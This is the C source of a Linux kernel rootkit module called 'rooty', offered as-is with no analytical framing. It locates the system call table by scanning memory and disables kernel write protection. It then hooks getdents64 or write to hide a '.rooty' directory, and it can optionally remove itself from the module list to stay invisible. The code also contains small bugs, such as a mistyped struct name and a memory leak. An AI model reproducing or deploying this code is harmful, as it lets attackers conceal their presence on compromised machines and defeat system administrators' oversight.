#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/kobject.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/dirent.h>

MODULE_LICENSE("GPL");
int rooty_init(void);
void rooty_exit(void);
module_init(rooty_init);
module_exit(rooty_exit);

#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK	0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK	0xffffffff81000000
#define END_CHECK	0xffffffffa2000000
typedef unsigned long psize;
#endif


psize *sys_call_table;
asmlinkage ssize_t (*o_write)(int fd, char *buff, ssize_t count);
asmlinkage int (*o_getdents64)(unsigned int fd, 
	struct linux_dirent *dirent,unsigned int count);

psize **find(void)
{
	psize **sctable;
	psize i = START_CHECK;
	while (i < END_CHECK)
	{
		sctable = (psize **)i;
		if (sctable[__NR_close] == (psize *)sys_close)
		{
			return &sctable[0];
		}
		i += sizeof(void *);
	}

	return NULL;
}

asmlinkage ssize_t rooty_write(int fd, const char __user *buff, size_t count)
{
	ssize_t ret;
	char *proc_protect = ".rooty"; /* The name of the directory to protect */
	char *kbuff = (char *)kmalloc(256, GFP_KERNEL);
	char *pos;

	copy_from_user(kbuff, buff, 255);

	if (strstr(kbuff, proc_protect))
	{
		kfree(kbuff);
		return EEXIST;
	}

	ret = o_write(fd, buff, count);
	kfree(kbuff);

	return ret;
}


asmlinkage int rooty_getdents64(unsigned int fd, 
	struct linux_dirent64 *dirp, unsigned int count)
{
	int ret = o_getdents64(fd, dirp, count);
	int pos;
	struct linux_dirent64 *d, *prev = NULL;
	char *kbuff = kmalloc(256, GFP_KERNEL);

	for (pos = 0 ; pos < ret-1 ; )
	{
		d = (struct inux_dirent64 *)((char *)dirp + pos);
		copy_from_user(kbuff, d->d_name, 255);

		if (strcmp(kbuff, ".rooty") == 0)
		{
			if (prev == NULL)
			{
				kfree(kbuff);
				*dirp = *(struct linux_dirent64 *)((char *)d + d->d_reclen);
				return ret - d->d_reclen;
			}
			else
			{
				prev->d_reclen += d->d_reclen;
				break;
			}
		}

		pos += d->d_reclen;
		prev = d;
	}
	return ret;
}

int rooty_init(void)
{
/*	To hide the module */
#ifdef INVISIBLE_MODULE
	list_del_init(&__this_module.list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
#endif

	if ((sys_call_table = (psize *)find()) != NULL)
		printk("rooty : sys_call_table found at %p\n", sys_call_table);
	else
		printk("rooty : sys_call_table not found\n");

	write_cr0(read_cr0() & (~0x10000));

#ifdef HIJACK_WRITE
	o_write = (void *)xchg(&sys_call_table[__NR_write], rooty_write);
#else
	o_getdents64 = (void *)xchg(&sys_call_table[__NR_getdents64], rooty_getdents64);
#endif

	write_cr0(read_cr0() | 0x10000);

	return 0;
}

void rooty_exit(void)
{
	write_cr0(read_cr0() & (~0x10000));

#ifdef HIJACK_WRITE
	xchg(&sys_call_table[__NR_write], o_write);
#else
	xchg(&sys_call_table[__NR_getdents64], o_getdents64);
#endif

	write_cr0(read_cr0() | 0x10000);
	printk("rooty : module removed\n");
}


